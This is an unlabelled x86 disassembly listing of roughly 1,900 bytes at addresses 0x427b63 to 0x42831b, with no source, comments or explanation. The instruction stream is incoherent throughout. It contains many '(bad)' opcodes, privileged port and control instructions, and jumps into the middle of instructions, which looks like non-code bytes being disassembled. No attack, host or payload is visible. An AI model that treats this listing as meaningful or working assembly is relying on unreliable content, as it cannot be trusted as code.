  427b63:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b69:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b6f:	add    BYTE PTR [ebx],al
  427b71:	mov    eax,eax
  427b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b74:	inc    ebp
  427b75:	dec    ebp
  427b76:	cmp    BYTE PTR [ebx],dh
  427b78:	pushf  
  427b79:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b7f:	(bad)  
  427b81:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427b89:	sar    eax,1
  427b8b:	rol    BYTE PTR [ebp+0x5],1
  427b8e:	xor    eax,DWORD PTR [ebp+0x3]
  427b91:	jmp    0x427b7e
  427b93:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427b99:	xor    eax,DWORD PTR [ebp+0x33]
  427b9c:	mov    eax,DWORD PTR [ebx]
  427b9e:	rol    BYTE PTR [ebx],1
  427ba0:	test   BYTE PTR [edi],cl
  427ba2:	cwde   
  427ba3:	shl    DWORD PTR [edx],0x4d
  427ba6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bac:	xor    edx,eax
  427bae:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bb4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bba:	add    BYTE PTR [ebx],dh
  427bbc:	inc    ebp
  427bbd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427bc3:	rdpmc  
  427bc5:	rol    DWORD PTR [ebx],0x4d
  427bc8:	loopne 0x427b55
  427bca:	push   ebp
  427bcb:	in     al,dx
  427bcc:	mov    cl,dl
  427bce:	adc    eax,edx
  427bd0:	jb     0x427bd7
  427bd2:	add    BYTE PTR [ebp+0x45],al
  427bd5:	jmp    0x427b62
  427bd7:	mov    ebx,eax
  427bd9:	test   al,0xcb
  427bdb:	dec    ebp
  427bdc:	dec    ebp
  427bdd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427be3:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427be9:	dec    ebp
  427bea:	mov    al,0x8b
  427bec:	dec    ebp
  427bed:	in     al,dx
  427bee:	xor    edx,ecx
  427bf0:	xor    edx,eax
  427bf2:	add    eax,DWORD PTR [ebp+0x3]
  427bf5:	jbe    0x427c06
  427bf7:	mov    eax,ecx
  427bf9:	test   al,0x45
  427bfb:	dec    ebp
  427bfc:	mov    DWORD PTR [ebx],esi
  427bfe:	loopne 0x427c33
  427c00:	inc    ebp
  427c01:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c07:	rol    esi,0x45
  427c0a:	scas   eax,DWORD PTR es:[edi]
  427c0b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c11:	mov    eax,ecx
  427c13:	hlt    
  427c14:	dec    ebp
  427c15:	inc    ebp
  427c16:	mov    eax,edi
  427c18:	loopne 0x427bf2
  427c1a:	retf   
  427c1b:	test   esi,ecx
  427c1d:	clc    
  427c1e:	scas   eax,DWORD PTR es:[edi]
  427c1f:	inc    ebp
  427c20:	mov    eax,edi
  427c22:	fdiv   st,st(0)
  427c24:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c2a:	cwde   
  427c2b:	cmp    dh,BYTE PTR [edx]
  427c2d:	pushf  
  427c2e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c34:	inc    esi
  427c36:	mov    ebp,DWORD PTR [eax-0x10]
  427c39:	inc    ebp
  427c3a:	dec    ebp
  427c3b:	xor    esi,DWORD PTR [ebx]
  427c3d:	add    eax,DWORD PTR [ebx]
  427c3f:	loopne 0x427c50
  427c41:	dec    ebp
  427c42:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c49:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427c4f:	lock cwde 
  427c51:	ret    
  427c52:	xor    al,BYTE PTR [ebp-0x77]
  427c55:	mov    esi,esp
  427c57:	rol    BYTE PTR [ebp-0x7c],1
  427c5a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c60:	call   edi
  427c62:	enter  0x4d45,0x8b
  427c66:	mov    esi,eax
  427c68:	fmul   st(3),st
  427c6a:	push   ebp
  427c6b:	dec    ebp
  427c6c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c72:	ret    0xc198
  427c75:	xor    al,BYTE PTR [esi-0x280276]
  427c7b:	dec    ebp
  427c7c:	jne    0x427cb1
  427c7e:	mov    eax,DWORD PTR [ebx]
  427c80:	cld    
  427c81:	loopne 0x427c33
  427c83:	push   ebp
  427c84:	add    DWORD PTR [eax+0x72851100],ecx
  427c8a:	inc    DWORD PTR [eax]
  427c8c:	inc    DWORD PTR [ebp-0x75]
  427c8f:	mov    edi,esp
  427c91:	lock add bl,0x1
  427c95:	retf   
  427c96:	add    dh,al
  427c98:	xor    dh,cl
  427c9a:	inc    ebp
  427c9b:	scas   eax,DWORD PTR es:[edi]
  427c9c:	mov    eax,DWORD PTR [ebx]
  427c9e:	shl    al,0x0
  427ca1:	inc    ebp
  427ca2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427ca8:	call   0x458ee0
  427cad:	ud0    eax,ecx
  427cb0:	adc    al,0x4d
  427cb2:	inc    ebp
  427cb3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cb9:	lock push 0x338055
  427cbf:	add    eax,DWORD PTR [eax]
  427cc1:	ud0    ecx,edx
  427cc4:	sbb    BYTE PTR [ebp+0x5e],dl
  427cc7:	xor    ecx,ecx
  427cc9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cd0:	push   ecx
  427cd1:	add    BYTE PTR [ebp-0x38],cl
  427cd4:	mov    DWORD PTR [esi-0x740004],eax
  427cda:	cld    
  427cdb:	inc    ebp
  427cdc:	xchg   edx,eax
  427cdd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427ce3:	xabort 0xaf
  427ce6:	icebp  
  427ce7:	mov    esi,DWORD PTR [ebp-0x28]
  427cea:	(bad)  
  427ceb:	retf   
  427cec:	or     ecx,eax
  427cee:	(bad)  
  427cef:	dec    ebp
  427cf0:	pop    es
  427cf1:	(bad)  
  427cf2:	(bad)  
  427cf3:	or     BYTE PTR [esi],al
  427cf5:	jb     0x427cbd
  427cf7:	add    BYTE PTR [ebx],al
  427cf9:	inc    ebp
  427cfa:	(bad)  
  427cfb:	mov    ecx,DWORD PTR [edx]
  427cfd:	fadd   st(6),st
  427cff:	ret    
  427d00:	add    ch,BYTE PTR [eax-0x37]
  427d03:	int    0x55
  427d05:	sub    ebp,esp
  427d07:	add    edx,DWORD PTR [ecx-0x14]
  427d0a:	inc    ebp
  427d0b:	inc    ebp
  427d0c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d12:	cld    
  427d13:	(bad)  
  427d14:	mov    gs,WORD PTR [edi+0xf893be0]
  427d1a:	mov    ebp,ebp
  427d1c:	clc    
  427d1d:	push   eax
  427d1f:	push   DWORD PTR [ebp-0x4]
  427d22:	mov    BYTE PTR [ebp+0xa],0xff
  427d26:	(bad)  
  427d27:	int3   
  427d28:	or     BYTE PTR [eax],al
  427d2a:	(bad)  
  427d2b:	lea    eax,[edi]
  427d2d:	ins    BYTE PTR es:[edi],dx
  427d2e:	(bad)  
  427d2f:	inc    DWORD PTR [ecx]
  427d31:	push   eax
  427d32:	mov    BYTE PTR [ebp+0x9],0x8b
  427d36:	leave  
  427d37:	les    edx,FWORD PTR [ebp+0x0]
  427d3a:	in     al,dx
  427d3b:	call   DWORD PTR [ecx-0x75]
  427d3e:	inc    ebp
  427d3f:	cld    
  427d40:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d46:	cld    
  427d47:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d4d:	std    
  427d4e:	mov    eax,DWORD PTR [eax]
  427d50:	clc    
  427d51:	test   eax,esi
  427d53:	je     0x427dca
  427d55:	mov    eax,esi
  427d57:	cld    
  427d58:	add    al,0x80
  427d5a:	add    WORD PTR [ecx+0x0],ax
  427d5e:	fadd   QWORD PTR [eax]
  427d60:	mov    BYTE PTR [eax],0xd0
  427d63:	push   0xffffffc3
  427d65:	push   edi
  427d66:	mov    edx,DWORD PTR [eax+0x51]
  427d69:	pop    edi
  427d6a:	lea    ebx,[ebx-0x8]
  427d6d:	ret    0x45
  427d70:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d76:	xchg   eax,edi
  427d78:	mov    DWORD PTR [ebp-0x75],ecx
  427d7b:	push   esi
  427d7c:	clc    
  427d7d:	jne    0x427d4f
  427d7f:	mov    ecx,0xf8450b0b
  427d84:	(bad)  
  427d85:	push   cs
  427d86:	or     BYTE PTR [ebp-0x3a],dh
  427d89:	cmp    eax,DWORD PTR [ecx]
  427d8b:	pop    esi
  427d8c:	(bad)  
  427d8d:	or     al,0x5
  427d8f:	inc    eax
  427d90:	leave  
  427d91:	in     al,dx
  427d92:	add    al,0x42
  427d94:	push   esi
  427d95:	and    eax,0xedc940cf
  427d9a:	inc    DWORD PTR [eax-0x75]
  427d9d:	fmul   QWORD PTR [ebx-0xf8739be]
  427da3:	inc    eax
  427da4:	nop
  427da5:	jmp    0x518b:0x8b8bc3ff
  427dac:	(bad)  
  427dad:	lea    eax,ds:0xff45e8f8
  427db3:	push   esi
  427db4:	push   DWORD PTR [ebp-0x39]
  427db7:	mov    eax,0x7edda46
  427dbc:	or     al,0x6
  427dbe:	push   DWORD PTR [ebp-0x3a]
  427dc1:	cmp    eax,DWORD PTR [edx]
  427dc3:	pop    esi
  427dc4:	ret    
  427dc5:	or     al,0x56
  427dc7:	inc    ecx
  427dc8:	push   ebp
  427dc9:	js     0x427db7
  427dcb:	inc    edx
  427dcc:	inc    ebp
  427dcd:	int    0x1
  427dcf:	inc    ecx
  427dd0:	sub    BYTE PTR ds:0xe77541fc,ah
  427dd6:	add    DWORD PTR [edx+0x1c],eax
  427dd9:	int3   
  427dda:	mov    eax,ebx
  427ddc:	adc    al,0x8b
  427dde:	xchg   edx,eax
  427ddf:	push   ecx
  427de0:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427de6:	rcl    DWORD PTR [esi-0x9],cl
  427de9:	jne    0x427e3b
  427deb:	mov    eax,0x7c80ece
  427df0:	rol    DWORD PTR [esi],cl
  427df2:	div    DWORD PTR [ebp+0x50]
  427df5:	cmp    ecx,edx
  427df7:	pop    esi
  427df8:	dec    BYTE PTR [edx]
  427dfa:	in     al,dx
  427dfb:	inc    edx
  427dfc:	sub    ebp,ecx
  427dfe:	inc    eax
  427dff:	(bad)  
  427e00:	push   eax
  427e01:	add    edx,DWORD PTR [eax-0x17]
  427e04:	push   edi
  427e05:	add    dh,dh
  427e07:	leave  
  427e08:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e0c:	add    BYTE PTR [ecx+0x0],dl
  427e0f:	inc    ebp
  427e10:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e16:	add    BYTE PTR [eax-0x7fbf448],bh
  427e1c:	add    al,0x2
  427e1e:	jmp    0x57e2978
  427e23:	jne    0x427e0d
  427e25:	mov    eax,DWORD PTR [edx]
  427e27:	or     BYTE PTR [eax],al
  427e29:	inc    ecx
  427e2a:	stc    
  427e2b:	in     eax,dx
  427e2c:	ss inc eax
  427e2e:	aas    
  427e2f:	out    0x7d,eax
  427e31:	inc    ecx
  427e32:	mov    esi,ecx
  427e34:	lock ret 0x7d
  427e38:	and    ecx,DWORD PTR [ebx-0x171777]
  427e3e:	add    bh,bh
  427e40:	aad    0xd7
  427e42:	add    dh,cl
  427e44:	clts   
  427e46:	(bad)  
  427e47:	call   0xffcd7d4c
  427e4c:	hlt    
  427e4d:	iret   
  427e4e:	jge    0x427e26
  427e50:	rol    DWORD PTR [esi-0x80],cl
  427e53:	icebp  
  427e54:	or     BYTE PTR [edi-0x27],cl
  427e57:	(bad)  
  427e58:	out    dx,al
  427e59:	mov    eax,DWORD PTR [ebx]
  427e5b:	(bad)  
  427e5c:	pop    esi
  427e5d:	push   es
  427e5e:	cmp    al,0xe8
  427e60:	sar    edi,0x8
  427e63:	inc    DWORD PTR [edi]
  427e65:	inc    esi
  427e66:	(bad)  
  427e67:	jmp    0x8b00:0x530e577e
  427e6e:	push   esi
  427e6f:	mov    eax,DWORD PTR [eax]
  427e71:	and    al,0x0
  427e73:	inc    ebp
  427e74:	push   eax
  427e75:	push   eax
  427e76:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e7c:	sub    edx,DWORD PTR [esi-0x24]
  427e7f:	jne    0x427e37
  427e81:	lods   eax,DWORD PTR ds:[esi]
  427e82:	mov    edx,DWORD PTR [edx-0x34]
  427e85:	dec    esi
  427e86:	out    0x83,eax
  427e88:	into   
  427e89:	push   edi
  427e8b:	loopne 0x427e5b
  427e8d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427e91:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427e98:	rol    DWORD PTR [edx],0x8
  427e9b:	mov    esp,ecx
  427e9d:	cmp    DWORD PTR [ebx],0xc
  427ea0:	mov    esi,0x5001c0
  427ea5:	push   eax
  427ea6:	push   cs
  427ea7:	push   eax
  427ea8:	(bad)  
  427ea9:	sub    edx,edi
  427eab:	push   esi
  427eac:	adc    al,0xcb
  427eae:	ins    DWORD PTR es:[edi],dx
  427eaf:	mov    eax,0x203e8
  427eb4:	add    al,ah
  427eb6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427ebd:	add    dh,al
  427ebf:	add    ah,ch
  427ec1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ec7:	pop    ecx
  427ec8:	or     eax,ebx
  427eca:	cli    
  427ecb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ed1:	lea    ebp,[ebx]
  427ed3:	mov    edx,DWORD PTR [edx-0x4]
  427ed6:	dec    ecx
  427ed7:	inc    ebp
  427ed8:	shr    BYTE PTR [ebx],0x4b
  427edb:	and    al,0x0
  427edd:	(bad)  
  427ede:	jne    0x427f25
  427ee0:	pop    eax
  427ee1:	mov    al,0x5a
  427ee3:	call   0x1418142
  427ee8:	and    al,0x85
  427eea:	push   edx
  427eeb:	add    BYTE PTR [eax+eax*1+0x0],ah
  427eef:	dec    ebp
  427ef0:	mov    cl,0x23
  427ef2:	jmp    0x427ee0
  427ef4:	mov    al,0xe7
  427ef6:	call   0x13881e4
  427efb:	shr    DWORD PTR [eax+ebx*2],cl
  427efe:	lock (bad) 
  427f00:	adc    eax,0x757f008d
  427f05:	out    0x58,eax
  427f07:	cmp    al,0x7
  427f09:	pop    edx
  427f0a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f11:	push   ecx
  427f12:	cld    
  427f13:	mov    esi,0x3b0175
  427f18:	and    al,0xb0
  427f1a:	xor    BYTE PTR [edx+0x1],0x8b
  427f1e:	add    ah,bh
  427f20:	mov    edi,DWORD PTR [ebp-0x4]
  427f23:	psubsw mm7,QWORD PTR [edi]
  427f26:	add    DWORD PTR [ebp+0x0],ebp
  427f29:	rcr    eax,1
  427f2b:	mov    edi,ecx
  427f2d:	and    eax,DWORD PTR [eax]
  427f2f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f35:	call   0x12f821e
  427f3a:	add    al,cl
  427f3c:	mov    ebp,esi
  427f3e:	aam    0x83
  427f40:	or     DWORD PTR [ecx],eax
  427f42:	jne    0x427f35
  427f44:	mov    eax,DWORD PTR [eax]
  427f46:	aam    0x0
  427f48:	dec    ebp
  427f49:	jne    0x427ed6
  427f4b:	cmp    ebx,eax
  427f4d:	jb     0x427f9c
  427f4f:	jmp    0x427edc
  427f51:	mov    ebx,esp
  427f53:	int3   
  427f54:	dec    ebp
  427f55:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f5c:	mov    edx,0x8b0a8b
  427f61:	cmp    ecx,DWORD PTR [eax]
  427f63:	jb     0x427f3c
  427f65:	pop    edx
  427f66:	push   edi
  427f67:	cli    
  427f68:	pop    es
  427f69:	mov    eax,ecx
  427f6b:	jb     0x427f6f
  427f6d:	add    DWORD PTR [ebx],0xa
  427f70:	mov    eax,DWORD PTR [ebx]
  427f72:	int3   
  427f73:	add    bh,BYTE PTR [esi+0x75d10006]
  427f79:	jmp    0x427f06
  427f7b:	mov    al,0xe8
  427f7d:	call   0x10381ff
  427f82:	add    edx,DWORD PTR [ecx+ecx*8]
  427f85:	pop    edi
  427f86:	or     BYTE PTR [ecx-0x73],bl
  427f89:	pop    ecx
  427f8a:	inc    edi
  427f8b:	xor    al,0xeb
  427f8d:	push   ecx
  427f8e:	mov    edi,DWORD PTR [edx+0xc506cc]
  427f94:	call   0xb18099
  427f99:	int3   
  427f9a:	sbb    BYTE PTR [esi],ch
  427f9c:	inc    ebp
  427f9d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fa3:	call   0x9b8212
  427fa8:	or     BYTE PTR [ebx-0x73],dl
  427fab:	cmp    al,0x47
  427fad:	mov    al,0x1
  427faf:	jb     0x427fb1
  427fb1:	mov    al,0x10
  427fb3:	push   eax
  427fb4:	add    al,0x75
  427fb6:	add    BYTE PTR [ebx],ch
  427fb8:	add    ebx,esp
  427fba:	int3   
  427fbb:	jne    0x427fcd
  427fbd:	movsx  edx,cl
  427fc0:	add    DWORD PTR [eax],eax
  427fc2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fc9:	mov    gs,edi
  427fcb:	add    BYTE PTR [eax-0x50],ch
  427fce:	add    al,ch
  427fd0:	mov    eax,DWORD PTR [ecx]
  427fd2:	sub    eax,DWORD PTR [eax]
  427fd4:	jb     0x42804b
  427fd6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427fda:	jge    0x427fc4
  427fdc:	add    al,0x1
  427fde:	add    DWORD PTR [eax],0x0
  427fe1:	jne    0x427fe3
  427fe3:	je     0x42802a
  427fe5:	mov    eax,DWORD PTR [edi]
  427fe7:	ror    BYTE PTR [ebp+0x4d],1
  427fea:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427ff1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427ff7:	mov    DWORD PTR [ebx],ebp
  427ff9:	fadd   DWORD PTR [eax+0x75]
  427ffc:	inc    eax
  427ffd:	pop    eax
  427ffe:	lea    ebx,[ecx+0x4f]
  428001:	push   0xb1000003
  428006:	out    dx,eax
  428007:	add    ebp,DWORD PTR [edx+edx*2]
  42800a:	add    BYTE PTR [ebx+ecx*4],bh
  42800d:	mov    ch,BYTE PTR [ebx]
  42800f:	jb     0x428083
  428011:	add    al,0x89
  428013:	push   eax
  428014:	call   0x842acd86
  428019:	add    DWORD PTR [eax+eax*1],eax
  42801c:	jae    0x428032
  42801e:	icebp  
  42801f:	inc    ebp
  428020:	mov    eax,DWORD PTR gs:[ecx]
  428023:	int3   
  428024:	out    dx,al
  428025:	loopne 0x428074
  428027:	sub    eax,DWORD PTR [edx]
  428029:	push   0xffffff83
  42802b:	pop    esi
  42802c:	push   cs
  42802d:	jl     0x428048
  42802f:	add    al,0xaf
  428031:	xor    eax,0x832b6d00
  428036:	mov    eax,DWORD PTR [edx]
  428038:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42803e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428044:	inc    ebp
  428045:	shr    ebx,0x3
  428048:	or     DWORD PTR [eax],0x4
  42804b:	push   0xffffffa5
  42804d:	pop    esi
  42804e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428055:	jmp    0x4280b4
  428057:	mov    edi,0xff0272
  42805c:	fdivr  QWORD PTR [ebp+0x5d]
  42805f:	push   0x4e
  428061:	pop    ecx
  428062:	call   0x42c467
  428067:	mov    DWORD PTR [ebx],eax
  428069:	in     al,0xc8
  42806b:	rol    BYTE PTR [ebp-0x75],0xc1
  42806f:	call   0xac8250
  428074:	pop    esi
  428075:	enter  0xceff,0x8b
  428079:	repz mov ecx,DWORD PTR [ebp-0x34]
  42807d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  428084:	je     0x428086
  428086:	or     DWORD PTR [ebx-0x74183b24],eax
  42808c:	jne    0x428072
  42808e:	jmp    0x428089
  428090:	push   DWORD PTR [edx-0x24]
  428093:	push   0x4d
  428095:	pop    ecx
  428096:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42809a:	jge    0x4280a2
  42809c:	mov    eax,eax
  42809e:	sub    ebp,DWORD PTR [edx+0x24]
  4280a1:	pop    esi
  4280a2:	inc    ebp
  4280a3:	mov    esp,0x8b6077
  4280a8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ae:	lods   al,BYTE PTR ds:[esi]
  4280af:	add    BYTE PTR [ebx],bh
  4280b1:	enter  0xce73,0x49
  4280b5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280bd:	stc    
  4280be:	jge    0x428132
  4280c0:	jnp    0xdd42042f
  4280c6:	call   0xc5819c
  4280cb:	fadd   st(0),st
  4280cd:	dec    esi
  4280ce:	ins    BYTE PTR es:[edi],dx
  4280cf:	stc    
  4280d0:	cmp    al,0x73
  4280d2:	push   ebp
  4280d3:	mov    eax,0xf8028b
  4280d8:	jne    0x42809b
  4280da:	mov    esi,ecx
  4280dc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280df:	add    edi,DWORD PTR [ebp-0x24]
  4280e2:	sub    esp,eax
  4280e4:	and    al,0x45
  4280e6:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4280ec:	sbb    al,0xee
  4280ee:	pop    esi
  4280ef:	call   0x82811f
  4280f4:	fsubr  st,st(3)
  4280f6:	sti    
  4280f7:	add    BYTE PTR gs:[ecx],bh
  4280fa:	add    eax,esp
  4280fc:	add    DWORD PTR [esi],eax
  4280fe:	rol    DWORD PTR [ebp+0x8],0x29
  428102:	mov    esp,eax
  428104:	clc    
  428105:	jne    0x42817c
  428107:	mov    eax,0x8b0673
  42810c:	loopne 0x428153
  42810e:	loopne 0x428099
  428110:	lods   al,BYTE PTR ds:[esi]
  428111:	int3   
  428112:	inc    ebp
  428113:	mov    DWORD PTR gs:[eax+edi*8],eax
  428117:	add    al,0xc3
  428119:	sub    ecx,DWORD PTR [ebp+0x47]
  42811c:	(bad)  
  42811e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428122:	add    eax,DWORD PTR [eax]
  428124:	call   0x6444229
  428129:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42812f:	dec    esi
  428130:	ins    DWORD PTR es:[edi],dx
  428131:	in     al,dx
  428132:	lea    eax,[eax]
  428134:	inc    ebp
  428135:	inc    ebp
  428136:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42813c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428146:	and    al,0xdc
  428148:	ror    DWORD PTR [edx+0x24],0xf7
  42814c:	or     BYTE PTR [ebp+0x4c],dh
  42814f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428153:	stos   BYTE PTR es:[edi],al
  428154:	adc    edx,edi
  428156:	inc    esp
  428157:	add    edi,DWORD PTR [eax]
  428159:	jne    0x42813e
  42815b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428161:	cmp    ecx,DWORD PTR [edi]
  428163:	sub    BYTE PTR [ebp-0x7e],dl
  428166:	sar    ebp,0xb
  428169:	jmp    FWORD PTR [edi+0x2400392a]
  42816f:	sub    esi,DWORD PTR [ebx-0x73]
  428172:	mov    esp,DWORD PTR [ecx+edi*4]
  428175:	mov    ecx,DWORD PTR [eax]
  428177:	and    BYTE PTR [eax],al
  428179:	jne    0x428145
  42817b:	sub    ebp,ecx
  42817d:	sbb    BYTE PTR [esi+0x32],ah
  428180:	dec    ebp
  428181:	push   ebp
  428182:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  428188:	ret    
  428189:	mov    edx,ebp
  42818b:	leave  
  42818c:	sub    DWORD PTR [esi+0x24],ebx
  42818f:	ret    0x2b
  428192:	pop    ax
  428194:	push   ebp
  428195:	rol    BYTE PTR [ebx],0xeb
  428198:	add    DWORD PTR [ecx+0x6c0001],0x40
  42819f:	jb     0x4281f6
  4281a1:	ret    
  4281a2:	in     al,dx
  4281a3:	jecxz  0x428130
  4281a5:	push   esi
  4281a6:	xchg   esp,eax
  4281a7:	jne    0x4281a9
  4281a9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281ac:	jne    0x428192
  4281ae:	mov    eax,DWORD PTR [ebp-0x77]
  4281b1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281b8:	mov    esi,DWORD PTR [ebp-0x75]
  4281bb:	pop    esi
  4281bc:	nop
  4281bd:	mov    eax,DWORD PTR [eax]
  4281bf:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281c5:	add    al,0x0
  4281c7:	inc    ebp
  4281c8:	mov    eax,DWORD PTR [ebx]
  4281ca:	mov    ebp,ebx
  4281cc:	cmp    al,0xf
  4281ce:	or     al,al
  4281d0:	inc    ebp
  4281d1:	inc    ebp
  4281d2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281d8:	cld    
  4281d9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281df:	add    BYTE PTR [ecx-0x5],dl
  4281e2:	add    eax,0x17200
  4281e7:	sbb    al,0x85
  4281e9:	dec    esp
  4281ea:	je     0x428224
  4281ec:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4281f0:	add    BYTE PTR [ebx],bh
  4281f2:	(bad)  
  4281f3:	and    al,0x39
  4281f5:	jae    0x428193
  4281f7:	mov    cl,cl
  4281f9:	inc    DWORD PTR [esp]
  4281fc:	push   ebp
  4281fd:	shr    esp,0x8
  428200:	in     al,dx
  428201:	push   esp
  428202:	add    DWORD PTR [eax],esp
  428204:	add    bl,cl
  428206:	inc    ebp
  428207:	mov    bh,0x89
  428209:	add    ah,bh
  42820b:	jmp    0xca7b9155
  428210:	pushf  
  428211:	dec    esp
  428212:	mov    edx,0xf8178520
  428217:	fst    DWORD PTR [ebp+0x0]
  42821a:	mov    BYTE PTR [eax],0xc4
  42821d:	sub    edx,DWORD PTR [ebx-0x3f]
  428220:	inc    ebp
  428221:	add    eax,0xc601dc
  428226:	mov    al,0xc6
  428229:	ins    BYTE PTR es:[edi],dx
  42822a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428231:	dec    esp
  428232:	jmp    DWORD PTR [eax]
  428234:	inc    ebp
  428235:	fnstcw WORD PTR [eax+0x29]
  428238:	test   BYTE PTR [eax],0xc5
  42823b:	rol    BYTE PTR [eax],0xc0
  42823e:	lea    ecx,[ebp-0x3cf0dbcb]
  428244:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42824a:	inc    esi
  42824b:	add    DWORD PTR [eax],ebx
  42824d:	add    dh,bh
  42824f:	mov    esi,DWORD PTR [edx+0x8]
  428252:	(bad)  
  428253:	fdiv   QWORD PTR ss:[ecx]
  428256:	(bad)  
  428257:	mov    bl,ch
  428259:	add    esi,eax
  42825b:	add    dh,bl
  42825d:	or     esi,eax
  42825f:	mov    dl,0xdf
  428261:	add    esi,eax
  428263:	add    al,ah
  428265:	push   cs
  428266:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42826d:	or     BYTE PTR [ebx],dh
  42826f:	dec    ecx
  428270:	lea    eax,[ebx]
  428272:	xor    eax,0x18fc0fc7
  428277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428278:	repz clc 
  42827a:	add    eax,DWORD PTR [ebp+0x46]
  42827d:	prefetcht0 BYTE PTR [ecx-0x2]
  428281:	xor    eax,0x7c60872
  428286:	mov    esp,0xbd32c698
  42828b:	pop    esi
  42828c:	mov    cl,0xbe
  42828f:	or     al,0xc6
  428291:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  428298:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  42829f:	add    dh,al
  4282a1:	mov    eax,ebx
  4282a3:	xor    DWORD PTR [ebx],0x35008dbc
  4282a9:	mov    ecx,DWORD PTR [edi]
  4282ab:	sbb    al,0x18
  4282ad:	inc    ebp
  4282ae:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282b5:	clc    
  4282b6:	(bad)  
  4282b7:	cmp    BYTE PTR [edx-0x64],dh
  4282ba:	lea    ecx,[ecx+0x45ffe838]
  4282c0:	mov    ecx,esp
  4282c2:	fadd   st,st(6)
  4282c4:	dec    ebp
  4282c5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282cb:	out    0x1,eax
  4282cd:	inc    ebp
  4282ce:	lea    ebp,ds:0xc8ffc6ff
  4282d4:	enter  0xa33,0xc6
  4282d8:	push   ebp
  4282d9:	leave  
  4282da:	(bad)  
  4282db:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4282e1:	add    BYTE PTR [ebp+0x44],al
  4282e4:	mov    eax,esp
  4282e6:	mov    WORD PTR [esi+0x43398300],?
  4282ec:	psubusw mm4,QWORD PTR [eax-0x78]
  4282f0:	add    BYTE PTR [ebx-0x1303f975],al
  4282f6:	add    BYTE PTR [ebp+0x1],0xf3
  4282fa:	add    BYTE PTR [ebp+0x38],al
  4282fd:	in     eax,dx
  4282fe:	inc    ebp
  4282ff:	inc    ebp
  428300:	mov    esp,ebx
  428302:	add    BYTE PTR [ebp+0x0],0xee
  428306:	mov    DWORD PTR [ebp-0x48],eax
  428309:	sub    eax,0x2e00454f
  42830e:	js     0x428355
  428310:	data16 js 0x428298
  428313:	idiv   bh
  428315:	inc    esp
  428316:	(bad)  
  428317:	fadd   st(7),st
  428319:	mov    dh,0x89
  42831b:	and    DWORD PTR [esi+0x43],0xffffffff
